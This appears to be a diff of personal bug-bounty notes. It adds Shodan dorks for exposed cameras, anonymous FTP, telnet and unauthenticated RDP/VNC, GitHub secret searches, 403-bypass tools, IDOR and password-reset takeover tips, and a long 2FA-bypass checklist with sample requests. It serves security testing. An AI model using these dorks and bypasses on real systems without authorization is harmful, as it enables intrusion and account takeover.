+25. “Set-Cookie: mongo-express=" 
+26. “Set-Cookie: user_id=" 
+27. “Set-Cookie: phpMyAdmin=" 
+28. “Set-Cookie: _gitlab_session” 
+29. “X-elastic-product: Elasticsearch” 
+30. “x-drupal-cache” 
+31. “access-control-allow-origin” 
+32. “WWW-Authenticate”  
+33. “X-Magento-Cache-Debug”   
+34. “kbn-name: kibana”
+
+
+SHODAN DORK:    for uselessness    
+webcamXP/webcam7:
+("webcam 7" OR "webcamXP") http.component:"mootools" -401
+
+Some Webcams(SQ Webcams?):
+Server: SQ-WEBCAM
+
+Yawcam Webcams:
+"Server: yawcam" "Mime-Type: text/html"
+
+Surveillance Cams:
+Server: uc-httpd 1.0.0
+NETSurveillance uc-httpd
+Surveillance cams with admin:admin or admin:(none) creds
+
+Hikvision Cameras:
+product:"Hikvision IP Camera"
+Link for Hikvision backdoor here: https://ipvm.com/reports/hik-exploit
+
+Generic dork for finding cameras:
+title:camera
+
+Generic dork for finding cameras (with screenshots):
+webcam has_screenshot:true
+
+Dahua Cameras:
+http.title:"WEB VIEW"
+
+Some random webcams:
+http.title:"Webcam"
+
+Vulnerable Services / Servers
+
+EternalBlue SMB RCE:
+os:"Windows 10 Home 19041
+
+ProFTPD 1.3.5 (mod_copy exec; CVE-2015-3306) :
+"220 ProFTPD 1.3.5"
+
+Anonymous FTP Login #1:
+"230 User anonymous"
+
+Anonymous FTP Login #2:
+"220" "230 Login successful." port:21
+
+Already Logged-In as root via Telnet:
+"root@" port:23 -login -password -name -Session
+
+No password for Telnet Access:
+port:23 console gateway
+
+Other Services that you can find
+
+OpenSSH:
+openssh port:22
+
+Logitech Media Servers:
+"Server: Logitech Media Server" "200 OK"
+
+Jenkins Unrestricted Dashboard:
+x-jenkins 200
+
+MySQL:
+"product:MySQL"
+
+MongoDB #1:
+mongodb port:27017
+
+MongoDB #2:
+product:"MongoDB"
+
+Interesting Things that you can find on Shodan
+
+RDP/VNC's WITHOUT AUTH:
+"authentication disabled" "RFB 003.008"
+remote desktop "port:3389"
+
+XZERES Wind Turbines:
+title:"xzeres wind"
+
+title:"IP CAMERA Viewer" Content-Length: 703
+
+MikroTik Routers:
+port:8291 os:"MikroTik RouterOS 6.45.9"
+
+Minecraft Servers:
+"Minecraft Server" "protocol 340" port:25565
+
+Smart TVs:
+"Chromecast:" port:8008
+
+Maritime Satellites:
+"Cobham SATCOM" OR ("Sailor" "VSAT")
+Real-time location of ships via satelite
+
+Tesla PowerPack Charging Status Page:
+http.title:"Tesla PowerPack System" http.component:"d3"
+
+Samsung Electronic Billboards:
+"Server: Prismview Player"
 
 
 
@@ -872,6 +498,7 @@ inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inur
 
 SQLi Prone Parameters
 inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com
+  site:redacted.com inurl:id=
 
 SSRF Prone Parameters
 inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com
@@ -881,6 +508,12 @@ inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:
 
 RCE Prone Parameters
 inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com
+
+
+
+📝Find endpoints for RCE testing
+
+Tip by : taksec
 
 High % inurl keywords
 inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php site:example[.]com
@@ -941,6 +574,9 @@ Dorks that work better w/o domain
 Bug Bounty programs and Vulnerability Disclosure Programs
 "submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"
 
+  site " bug bounty"
+  site:ch inurl:security.txt "bounty"
+
 Apache Server Status Exposed
 site:*/server-status apache
 
@@ -958,30 +594,12 @@ inurl:(url= | return= | next= | redirect= | redir= | ret= | r2= | page=) inurl:&
 
 
 
+Dork: intitle:"index of" "database.sql"
 
 
-## use WaybackRust        .. a too made with rust 
-   waybackrust urls [FLAGS] [OPTIONS] <domain.com or file.txt or stdin>
- waybackrust urls gap.com --output ~/Desktop/file.txt > ~/Desktop/another_file.txt
+
+
    
-
-FLAGS:
-    -h, --help       Prints help information
-    -n, --nocheck    Don't check the HTTP status
-    -p, --nocolor    Don't colorize HTTP status
-        --silent     Disable informations prints
-    -s, --subs       Get subdomains too
-    -V, --version    Prints version information
-     -b, --blacklist <extensions to blacklist>        The extensions you want to blacklist (ie: -b png,jpg,txt)
-    -d, --delay <delay in milliseconds>             
-    -o, --output <FILE>
-            Name of the file to write the list of urls (default: print on stdout)
-
-    -t, --threads <Number of concurrent requests>    
-    -w, --whitelist <extensions to whitelist> 
-
-
-
 Github For Recon 
 
 path:**/.env AWS_ACCESS_KEY_ID
@@ -1075,9 +693,8 @@ Check robots.txt page
 
  END End 
 
- 
 
- 
+
  
  BOKEN LINK HIJACKING
 Manually find and click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link)
@@ -1189,10 +806,32 @@ Now you need to check if company has the page or not , if no then register as th
      visual recon 
      gowitness
      https screenshoot
-     
-  
-   
-   
+        
+        
+        
+        
+        
+       TIP   TIP
+       Tips
+
+
+Look into subdomains that allow sign-in with Google, as they may contain sensitive information accessible only to team members. 
+
+Dork: site:*.example.com inurl:login | inurl:signin Google
+
+You might uncover subdomains that let you log in with personal Gmail accounts,
+        
+        
+        tip
+        Cache purge requests are not authenticated.
+
+→ curl -X PURGE https://target[.]evil[.]com
+
+→ curl -s -D - https://target[.]evil[.]com -o /dev/null
+        
+        
+        
+           
    TOOLS TO CHECK ON  
    subdomain_takeover         https://github.com/sarveshkapre/subdomain_takeover
    XSS-Automation-Tool        https://github/EmperialX/Xss-automation-Tools    
@@ -1222,6 +861,32 @@ cat all_js.js | grep -r -E # Similar to the grep above...
 nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
 
 
+  tip  tip
+  gathering all target endpoints
+filter the results just for pic extensions
+(cat endpoints.txt | egrep 'jpg|jpeg|png' > results.txt)
+
+  found a passport on specific endpoint ==> app[.]com/xxxx/cdn/file/xxx.jpg 
+
+visit app[.]com/xxxx/cnd/ ==> dir listing open
+
+and the results is tons of PII🤠
+don't forget checking (jpg/jpeg/etc..) all the time
+
+
+  tip
+  1/ 
+Mass hunting exposed git with hednsextractor:
+
+  1⃣    tools: hednsextractor + httpx + Dotgit Plugin
+
+2⃣     hednsextractor -target "your target" -silent | httpx -path /.git/config -status-code -ms 200 -silent
+(filter param with status conde and ms param)
+   https://t.co/iEkaJAO6qV
+
+
+
+
 
                            IDORS      IDORS      IDORS   
    Base Steps:
@@ -1237,7 +902,48 @@ Log in to the application
 Again log in to the same account from different browser.
 Attempt to change the password. The application will send a password reset link to your email.
 Open the link and reset the password.
-Go to the other browser and reload the page. If you are successfully able to reload the page and still logged in, you have a bug!
+Go to the other browser and reload the page. If you are successfully able to reload the page and still logged in, you have a bug
+
+
+
+  tip
+   idors
+
+Check if recovery link on a punycode domain can be change  from victim@example.com to victim@exámple.com, which resolves to victim@xn--exmple-qta.com, potentially resulting in zero-interaction ATO.
+https://0xacb.com/2022/11/21/recollapse/
+
+Check this tool
+https://github.com/0xacb/recollapse 
+
+
+    tip
+    Idor tip
+Anytime you see a request and the postdata is JSON, {"example":"example"}, try simply injecting a new parameter name, {"example":"example","id":"1"}.
+
+
+
+
+  
+  tip                    https://jineeshak.github.io/posts/Unauthenticated-Email-Enumeration-via-API-Fuzzing/
+  
+   chcek for   Unauthenticated-Email-Enumeration-via-API-Fuzzing/  chcek and fuzz how the app hnadles  email address  entered during registration already existed or not
+       POST /registration HTTP/2
+        Host: domain
+          Content-Type: application/json;charset=UTF-8
+
+          {"userEmail":"%"}
+  
+
+  Hpp pollution / idor
+Added more parameter to the page
+
+Example
+uid=1134885524&nid=22+26&sig=647192e86e28fb6 
+
+Then check if you could add more parameters  or replace replace  Parameters with another one
+
+uid=2321301342&uid=1134885524&nid=22+26&sig=  647192e86e28fb6691
+  
 
   tip
   Password Reset Link sent over HTTP
@@ -1265,6 +971,15 @@ If not, you got a bug!
 
 5) Enter those new UUIDs as a match field.
 6) Map the application again. Start populating fields and view objects. Be aware at what is happening. If you don't get error messages everywhere. It likely means there is an IDOR there and it's time to check the other user account.
+
+   tip
+   1- Found path for portal in wayback
+2- Fuzz it
+3- Found login page
+4- Another Fuzzing
+5- See /manage-users.php with big content length but 302 status
+6- Setup match & replace with 302 to 200
+7- Bypass authentication and access to admin panel
 
 
    tip tip
@@ -1606,7 +1321,7 @@ session cookies defined by the web application server.
 • Cookie value can be changed and one may gain unauthorized access or logical escalation
 
 
-
+  
 
   
 
@@ -1627,7 +1342,6 @@ search all the endpoints having ID which the search engine may have already inde
 [ ] Bruteforce Hidden HTTP parameters
 use tools like arjun , paramminer
 
-    
     tip    UPDATING ACCOUNT FIXTURES
     Sometimes when updating your account settings, they'll send your userid as a parameter. Manipulating this can sometimes result in another users profile being edited. Don't forget that if one feature is vulnerable to IDOR then it may be a site-wide issue (and don't forget to check mobile site!). Even if you do not see your ID in the post data, just simply try adding it. id=, uid=, userid=, especially if it is a GraphQL query or JSON post data (if it's PUT).
 
@@ -1690,7 +1404,7 @@ Pages that generate dynamic content, such as PDF downloads.
   
   
   
-I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
+I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒.      check    https://github.com/intigriti/misconfig-mapper
 
 Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
 
@@ -1716,6 +1430,21 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
      do  a password reset in browers1
      open the password reset email in browers2 (without using burp) and copy the token
      search for your burp history (browser1) for the token. if there is, you have got yourself a nice easy account takeover
+     
+     
+     
+      FORGOT PASSWORD   TIP             FORGOT PASSWORD   TIP   
+      https://medium.com/@suprajabaskaran8/checklist-for-forgot-password-functionality-3f61c34a15eb
+      
+      check for 
+        ***      1. Input Validation Testing:
+                    2. Brute Force Protection:
+                    3. Email Security:
+                    4. Token Security:
+                    5. Error Handling:
+                    6. Session Management:
+      
+      
    
    
   TIPS 1
@@ -1816,7 +1545,7 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
       
     tip6
       
-Here's a simple approach to spot these vulnerabilities: misconfigured object  IN  Salesforce site?
+Here's a simple approach to spot these vulnerabilities: misconfigured object  IN  Salesforce site?      chcek this tool   https://github.com/intigriti/misconfig-mapper
 
 1️⃣ Install this amazing tool - 🔧 https://github.com/moniik/poc_salesforce_lightning
 2️⃣ Run python3 http://exploit.py -u https://{{target(.)com -d -s
@@ -2045,7 +1774,7 @@ There are many additional ideas you can build upon to enhance your automation ca
          2. Click on action -> do -> intercept the response to this request.
         3. Click forward.
        4. Check response if that contains any link, any token or OTP.
-        
+        xor
         Steps (For password reset):
         1. Intercept the forget password option.
        2. Click on action -> do -> intercept the response to this request.
@@ -2173,9 +1902,22 @@ To check the randomness of the OTP I decided to send many requests at a time in 
       check for id parameter in the request of burpsurp
       mauipulate the response  and check for user roles 
    
-   
-   
+
+
+
    403 BYPASS    403 BYPASS     403 BYPASS
+   
+   https://github.com/Dheerajmadhukar/4-ZERO-3/      this is best from command line
+      https://github.com/iamj0ker/bypass-403
+   https://github.com/reinhardt-pwn/Bypass-http         check more on github
+     guide
+     To use this tool, you’ll need to enter the IP of the target (if you only have the DNS address, go to a DNS lookup online), and the path to the Access Denied error.
+     python3 bypass_http.py -i 94.237.62.195 -a /auth/login -p 36517  -v HTTP/1.0
+     
+     
+    
+   
+   
    
    /// finding hidden parameter /// ///
    https://medium.com/mii-cybersec/hunting-for-hidden-parameters-in-burp-suite-98b54616f863
@@ -2198,7 +1940,7 @@ To check the randomness of the OTP I decided to send many requests at a time in 
    
    
    
-   ## Change request method:
+   ## tips
 
 Change requested methods like GET → POST, GET — > TRACE etc.
 
@@ -2254,7 +1996,7 @@ xyz.com/%2f/secret.txt/
     USER-AGENT FUZZING    *****   i will look more about this 
     Sometimes developers want to serve different content depending on what kind of browser/OS you use to access the web app.
     
-    HTTP HEADERS FUZZING 
+    HTTP HEADERS FUZZING  Manupulation
     this technique involves sending a request to the target server with a modified HTTP header. X-Forwarded-For, Referer and Authorization headers are the most popular one to be modified. X-Forwarded-For can be fuzzed to bypass security controls that rely on IP address filtering. By changing the IP address in this header, an attacker can attempt to bypass any security controls that are based on IP address filtering
     
     Headers:
@@ -2290,14 +2032,1157 @@ Values:
              host: target.com
              x-original-Url: /admin 
     
+    tip 
+    FUZZING the URLpath     check other3ly 403 bypass
+    
+    add .  //  and ; in the end of the url  
+    example
+    https://target.secret/.   or   .secret/.
+     https://target//secret//           //secret/.
+      https://target/.secret/.
+       https://target;secret
+        https://target.;secret
+         https://target//;//secret
+         /secret.json                                      -> 200
+         
+    
+    
+    DOWNGRADE THE PROTOCOL VERSION.
+    You can also try all other techniques along with downgrading the protocol, one useful one might be to downgrade to 1.0 and remove the Host header at all - it can cause unexpected behaviour of the server
+    0.9    1.0   1.1   2
+    
+   TIP
+    Case switching technique
+It involves altering the case of characters in the URL path to try and bypass access controls. example.com/user gives you 401? Try example.com/User, example.com/%75ser or example.com/USer etc.
+    
+    HTTP REQUEST SMUGGLING    ******   (****    check http request
+    
+    Exploiting Hop-by-Hop request header
+    
+    To understand this technique one should first get familiar with hop-to-hop headers. Hop-by-hop headers are HTTP headers that are intended for communication between a client and a server, and that are not forwarded by intermediaries such as proxies or caches. These headers are called "hop-by-hop" because they are processed on a per-hop basis, meaning that each intermediary along the path of the request will see and potentially modify the headers as they pass through. The HTTP/1.1 specification defines the following headers as hop-by-hop headers:
+    Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding
+    
+    
+    
+    SPRING FRAMEWORK SPECIFIC BYPASS TECHNIQUE     **** check more on this   ****
+    
+    
+    
+    NAHAMCOM
+    
+    RECOLLAPSE  TOOLS    by @0xacb , this tool is all about bypass of regex, probing the unknown 
+    https://github.com/0xacb/recollapse?tab=readme-ov-file                                 https://0xacb.com/2022/11/21/recollapse/
+    https://github.com/0xacb/recollapse/blob/main/slides/nahamcon_2022_eu_till_recollapse.pdf
+    
+    https://example.com/redirect?url=https://smart.com  ✔️
+    https://example.com/redirect?url=https://evil.com   ❌
+    
+          done because of validation , sanitization, nomalization of  the backend modern api rely on regex ,
+          avoid depulicate of emails 
+          
+          problems with validation
+            mostly nt tested
+            copied from online site, like stack overflow or other sources
+            
+    NOTE, $, asserts position at the end of the string, or before the line terminator right at the end of the string
+          
+    THe technique
+      1   identify
+       2)  fuzz the position
+        3)  analyse the responses
+        
+        
+        usage  or Methodology
+     1   set your goal (ATO)
+      2  pick your target (email)
+      3   identify all flows that consume it
+      4  for every endpoint: USE RECollapse
+      5   analyze all response codes. ANy successful reponse ?
+                       is the regex always the same in all endpoint ? usually not
+                       pick a weird byte that went through
+       
+       6 go  throught all the flows from step 3
+             recovery, login, signup, Oauth, SSO, email change and confirmation(depends on the target)
+        7  you just found a bug
+                  look for error and weird behaviour
+                  try to realise the impact or aan attack scenario
+                  if not, go back to to step 5b or 1/ 2
+                  
+                  
+            NOTE,
+              CAching  rules are usually regex-based
+              a stitic extension is not enough these day to perform web cache deception
+              we need to enforce the correct content-tye in the response
+              let fuzz it
+              
+              
+  tip              check for apps that allows single sso like email  and perform recollpase, you might be succesful
+  
+   tip check how to bypass email @Othauth with recollaspe  and try all endpoits that needs regex , then use recollapse
+   
+   
+   
+   COMMAND LINE DATA -WRANGSNG  by the almight TOMNOMNOM       https://poc.lol/files/cli-data-wrangling.pdf
+    
+    You can append to a file instead of overwriting it:
+○ Overwrite: cmd > outputFile
+○ Append: cmd >> outputFile
+● To write to a file but still see the output in your terminal you can use tee:
+○ Overwrite: cmd | tee outputFile
+○ Append: cmd | tee -a outputFile
+
+Extract or remove fields with awk:
+○ Extract third field: cmd | awk '{print $3}'
+○ Extract last field: cmd | awk '{print $NF}'
+○ Remove fifth field: cmd | awk '{$5 = ""; print $0}'
+
+Write unique lines to a file:                     cmd | anew outputFile
+
+  Grep
+● Grep works on stdin by default, and outputs any matching line
+○ Match subdomains of example.com: cat domains.txt | grep '\.example\.com$'
+● Use -o to extract the text that matches; -E for extended regular expressions
+○ Extract TLDs from domains: cat domains.txt | grep -oE '\.[a-zA-Z]+$'
+● Search recursively with -r
+○ Search current directory for GCP keys: grep -rE 'AIza[a-zA-Z0-9-]+' *
+● Exclude lines with -v; be case-insensitive with -i
+○ Exclude blog subdomains: cat domains.txt | grep -vi blog
+
+
+  Find
+● The find command lists files and directories recursively, with filters
+● You can filter by type:
+○ Files in the current directory: find . -type f
+○ Directories in /etc: find /etc/ -type d
+● By name:
+○ Files ending with .txt: find . -type f -name '*.txt'
+○ Anything containing 'conf': find . -name '*conf*'
+● By size:
+○ Empty files: find . -size 0
+○ Bigger than 200k: find . -size +200k
+● By when they changed:
+○ In the last 5 minutes: find . -mmin '-5'
+○ More than 30 minutes ago: find . -mmin '+30'
+● And a ton more things…
+○ Find out more: man find
+
+
+   
+              
+             
+        
+        
+           
+        
+    
+    
+    
+
+
+
+   
+  
+   
+   2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
+   
+   
+   2FA Bypass techniques: 🍀🔥
+
+1. Response Manipulation
+In response if "success":false
+         Change it to "success":true
+
+ 2. Status Code Manipulation
+If Status Code is 4xx
+Try to change it to 200 OK and see if it bypass restrictions
+
+3. 2FA Code Leakage in Response
+Check the response of the 2FA Code Triggering Request to see if the code is leaked.
+
+4.JS File Analysis
+Rare but some JS Files may contain info about the 2FA Code, worth giving a shot
+
+5.2FA Code Reusability
+Same code can be reused
+
+6.Lack of Brute-Force Protection
+Possible to brute-force any length 2FA Code
+
+7.Missing 2FA Code Integrity Validation
+Code for any user account can be used to bypass the 2FA
+
+8.CSRF on 2FA Disabling
+No CSRF Protection on disabling 2FA, also there is no auth confirmation
+
+9. Password Reset Disable 2FA
+2FA gets disabled on password change/email change
+
+10.Backup Code Abuse
+Bypassing 2FA by abusing the Backup code feature
+Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA  reset restrictions
+
+11.Clickjacking on 2FA Disabling Page
+Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
+
+12.Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
+If the session is already hijacked and there is a session timeout vulnerbility
+
+13.Bypass 2FA with null or 000000
+Enter the code 000000 or null to bypass 2FA protection.
+
+Steps:-
+1. Enter “null” in 2FA code
+2. Enter 000000 in 2FA code
+3. Send empty code - Someone found this in grammarly
+4. Open new tab in same browser and check if other API endpoints are accessible  without entering 2FA
+
+14. Google Authenticator Bypass
+Steps:-
+1) Set-up Google Authenticator for 2FA
+2) Now, 2FA is enabled
+3) Go on password reset page and change your password
+4) If you are website redirect you to your dashboard then 2FA (Google Authenticator) is bypassed
+
+15. Bypassing OTP in registration forms by repeating the form submission multiple times using repeater
+Steps :-
+1) Create an account with a non-existing phone number
+2) Intercept the Request in BurpSuite
+3) Send the request to the repeater and forward
+4) Go to Repeater tab and change the non-existent phone number to your phone number
+5) If you got an OTP to your phone, try using that OTP to register that non-existent number
+
+   
+   
+   
+   
+  note :  bypassed by adding two X-Forwarded-For: IP headers.
+Copy
+POST /reset HTTP/2
+Host:example.com
+X-Forwarded-For:1.1.1.1
+X-Forwarded-For:2.2.2.2
+   
+   
+   Zero Interaction Mass Account Password Reset Vulnerability
+   Navigate to https://xxxx.xxx.com/xx?id=xx_forgot_password.
+Enter the victim’s email address.
+Intercept the request using a proxy tool like Burp Suite.
+Modify the “pass_sent” parameter from false to true in the POST request body:
+{
+  "emailEmpty": true,
+  "pass_sent": false,
+  "customer_email": "{victim's email}",
+  "action": "changePassword",
+  "sessionRotationTrigger": true
+}
+Forward the request to the server.
+
+
+tip tip
+ when testing testing the password reset functionality always, check if the ‘first name’ or ‘last name’ fields of the user were reflected in the email in order to attempt an HTML email injection attack.
+ 
+ tip
+ [1] An attacker sends a request to the API endpoint “/api/v1/people/forgot_password” requesting the reset password of the victim’s account.
+
+[2] The Attacker paste the reset password token and the victim’s ID (extracted from the response) in the password reset link :
+
+https://www.redacted.com/reset_password?code="REPLACE_WITH_RESET_PASSWORD_CODE"&id=REPLACE_WITH_ID_PARAMETER
+
+[3] The attacker can now open the link in his browser, and reset the victim’s password.
+
+[4] The Attacker gain access to the account (Account Take Over), without any action from the victim.
+   
+   
+   tip   tip   tip    https://infosecwriteups.com/story-of-lock-up-users-account-by-dos-attack-cost-1-100-87b47d06a7c1
+   When a user has an active session on the website and he’s working on the website online, when the update password request is sent to the user’s email, the user’s session is locked until they enter the temp password and update their password without them knowing this is happening by the attacker.
+
+But this wasn’t as easy as it looks, there was a CAPTCHA in our way to making the request which could be bypassed by removing the CAPTCHA parameter.
+
+Now the attacker could lock someone’s account just by having their email which was public in their profile.
+   
+   
+   There are several ways to bypass the OTP, 
+
+I attempted to brute force the OTP code, but there was a rate limit, so I failed.
+I experimented with magic OTPs, and as you can guess, I failed.
+I tested a Race condition on OTPs, and again, I failed.
+
+
+    . Go to https://www.xyz.com.
+2. Go for the password reset option.
+3. Enter the victim’s mail id.
+4. Enter a random 4-digit OTP.
+5. Capture the request in burp and send it to an intruder.
+6. Create the payload of 4 digit number and start the attack.
+7. You can see the changes in the length and status code 200 OK.
+8. Enter the correct OTP and change the password of the victim’s account.
+
+
+  tip 
+  go  to the password reset page and entered your email
+  run  Burp Suite and make Intercept on.
+  Create new password and confirm it then clicked in Reset Password button.
+  intercepted the request and started to analyzing each request
+  Intercepted all requests from target.com, check  the request that is responsible for redirect to /logout page, and  drop it using Burp Suite
+  Returning to the browser, and check if it  have redirect you  to the profile page without asking for 2fa code.
+
+   
+     Bypassing two-factor authentication
+[ ] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that
+after a user has completed the initial login step, the website doesn't adequately verify that the same user
+is completing the second step For example, the user logs in with their normal credentials in the first step
+as follows:
+POST /login-steps/first HTTP/1.1
+Host: vulnerable-website.com
+...
+username=carlos&password=qwerty
+They are then assigned a cookie that relates to their account, before being taken to the second step of
+the login process:
+HTTP/1.1 200 OK
+Set-Cookie: account=carlos
+GET /login-steps/second HTTP/1.1
+Cookie: account=carlos
+When submitting the verification code, the request uses this cookie to determine which account the user
+is trying to access:
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=carlos
+...
+verification-code=123456`
+In this case, an attacker could log in using their own credentials but then change the value of the
+account cookie to any arbitrary username when submitting the verification code.
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=victim-user
+...
+verification-code=123456
+[ ] Clickjacking on 2FA Disable Feature
+1. Try to Iframe the page where the application allows a user to disable 2FA
+2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to login
+[ ] Response Manipulation
+1. Check Response of the 2FA Request.
+2. If you Observe "Success":false
+3. Change this to "Success":true and see if it bypass the 2FA
+
+[ ] Status Code Manipulation
+1. If the Response Status Code is 4XX like 401, 402, etc.
+2. Change the Response Status Code to "200 OK" and see if it bypass the 2FA
+[ ] 2FA Code Reusability
+1. Request a 2FA code and use it
+2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
+3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not wh
+4. Also, try to re-use the previously used code after long time duration say 1 day or more. That
+
+[ ] CSRF on 2FA Disable Feature
+1. Request a 2FA code and use it
+2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
+3. Also, try requesting multiple 2FA codes and see if previously requested Codes
+expire or not when a new code is requested
+4. Also, try to re-use the previously used code after long time duration say 1 day or
+more. That will be an potential issue as 1 day is enough duration to crack and guess
+a 6-digit 2FA code
+
+
+[ ] Backup Code Abuse
+Apply same techniques used on 2FA such as Response/Status Code Manipulation,
+Brute-force, etc. to bypass Backup Codes and disable/reset 2FA
+[ ] Enabling 2FA Doesn't Expire Previous Session
+1. Login to the application in two different browsers and enable 2FA from 1st session.
+2. Use 2nd session and if it is not expired, it could be an issue if there is an insufficient
+session expiration issue. In this scenario if an attacker hijacks an active session before
+2FA, it is possible to carry out all functions without a need for 2FA
+[ ] 2FA Refer Check Bypass
+1. Directly Navigate to the page which comes after 2FA or any other authenticated
+page of the application.
+2. If there is no success, change the refer header to the 2FA page URL. This may fool
+application to pretend as if the request came after satisfying 2FA Condition
+[ ] 2FA Code Leakage in Response
+1. At 2FA Code Triggering Request, such as Send OTP functionality, capture the Request.
+2. See the Response of this request and analyze if the 2FA Code is leaked.
+[ ] JS File Analysis
+1. while triggering the 2FA Code Request,
+2. Analyze all the JS Files that are referred in the Response
+
+3. to see if any JS file contain information that can help bypass 2FA code.
+[ ] Lack of Brute-Force Protection
+This involves all sort of issues which comes under security misconfiguration such as
+lack of rate limit, no brute-force protection, etc.
+1. Request 2FA code and capture this request.
+2. Repeat this request for 100-200 times and if there is no limitation set, that's a rate limit
+3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any succ
+4. You can also try to initiate, requesting OTPs at one side and brute-forcing at
+another side. Somewhere the OTP will match in middle and may give you a quick result
+[ ] Password Reset/Email Change - 2FA Disable
+1. Assuming that you are able to perform email change or password reset for the
+victim user or make victim user do it by any means possible.
+2. 2FA is disabled after the email is changed or password is reset. This could
+be an issue for some organizations. However, depends on case by case basis.
+[ ] Missing 2FA Code Integrity Validation
+1. Request a 2FA code from Attacker Account.
+2. Use this valid 2FA code in the victim 2FA Request and see if it bypass the 2FA Protection.
+[ ] Direct Request
+1. Directly Navigate to the page which comes after 2FA or any other authenticated
+page of the application.
+2. See if this bypasses the 2FA restrictions.
+3. try to change the **Referrer header** as if you came from the 2FA page.
+[ ] Reusing token
+1. Maybe you can reuse a previously used token inside the account to authenticate.
+[ ] Sharing unused tokens
+1. Check if you can get the token from your account and try to use it to bypass the 2FA in a diff
+[ ] Leaked Token
+1. Is the token leaked on a response from the web application?
+[ ] Session permission
+1. Using the same session start the flow using your account and the victim's account.
+2. When reaching the 2FA point on both accounts,
+3. complete the 2FA with your account but do not access the next part.
+4. Instead of that, try to access the next step with the victim's account flow.
+5. If the back-end only set a boolean inside your sessions saying that you have successfully pass
+[ ] Password reset function
+1. In almost all web applications the **password reset function automatically logs the user into
+2. Check if a **mail** is sent with a **link** to **reset the password** and if you can **reuse**
+[ ] Lack of Rate limit
+Is there any limit on the number of codes that you can try, so you can just brute force it? Be ca
+[ ] Flow rate limit but no rate limit
+In this case, there is a flow rate limit (you have to brute force it very slowly: 1 thread and so
+[ ] Re-send code and reset the limit
+There is a rate limit but when you "resend the code" the same code is sent and the rate limit is
+[ ] Client side rate limit bypass
+{% content-ref url="rate-limit-bypass.md" %} rate-limit-bypass.md {% endcontent-ref %}
+[ ] Lack of rate limit in the user's account
+Sometimes you can configure the 2FA for some actions inside your account (change mail, password..
+[ ] Lack of rate limit re-sending the code via SMS
+You won't be able to bypass the 2FA but you will be able to waste the company's money.
+[ ] Infinite OTP regeneration
+If you can **generate a new OTP infinite times**, the** OTP is simple enough** (4 numbers), and y
+[ ] Guessable cookie
+If the "remember me" functionality uses a new cookie with a guessable code, try to guess it.
+
+When the 2FA is enabled, previous sessions created should be ended. This is because when a client
+[ ] Improper access control to backup codes
+Backup codes are generated immediately after 2FA is enabled and are available on a single request
+[ ] Information Disclosure
+If you notice some confidential information appear on the 2FA page that you didn't know previousl
+[ ] Bypass 2FA with null or 000000
+[ ] Previously created sessions continue being valid after MFA activation
+1 access the same account on https://account.grammarly.com in two devices
+2 on device 'A' go to https://account.grammarly.com/security > complete all steps to activate the
+Now the 2FA is activated for this account
+3 back to device 'B' reload the page The session still active
+[ ] Enable 2FA without verifying the email I able to add 2FA to my account without verifying my email
+Attack scenario :
+Attacker sign up with victim email (Email verification will be sent to victim email).
+Attacker able to login without verifying email.
+Attacker add 2FA.
+[ ] Password not checked when disabling 2FA
+PoC
+1- go to your account and activate the 2FA from /settings/auth
+2- after active this option click on Disabled icon beside Two-factor authentication.
+3- a new window will open asking for Authentication or backup code - Password to confirm the disable
+
+4- in the first box enter a valid Authentication or backup code and in the password filed enter a
+5- the option will be disabled successful without check the validation of the password.
+[ ] “email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired
+Steps To Reproduce:
+Note:
+1-Use burp suite or another tool to intercept the requests
+2-Turn on and configure your MFA
+3-Login with your email and password
+4-The page of MFA is going to appear
+5-Enter any random number
+6-when you press the button "sign in securely" intercept the request POST auth.grammarly.com/v3/a
+"mode":"sms" by "mode":"email"
+"secureLogin":true by "secureLogin":false
+7-send the modification and check, you are in your account! It was not necessary to enter the pho
+[ ] 2FA bypass by sending blank code
+1- Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_i
+2- Enable 2FA
+3- Logout
+4- Login again and notice OTP is asked
+5- Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
+6- Before forwarding the request to server, remove the code and forward
+7- Turnoff Intercept and notice that your login request has been fulfilled
+
+
+tip
+Browser A: The attacker opens the login page and enters credentials for an account without 2FA
+
+Browser B: The attacker opens the login page and enters credentials for the victim who has 2FA enabled. Consequently, they are redirected to /login/key/random_key
+
+Browser B: The attacker substitutes the session ID with Browser A's session ID and refreshes the page
+
+Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled
+
+  tip  tip
+Create an account https://example[.]com/register
+Fill in all the required data enter the phone number and send the form.
+We will receive a five-digit OTP on the phone number used for registration. Enter any random 5 digits, e.g. 00000
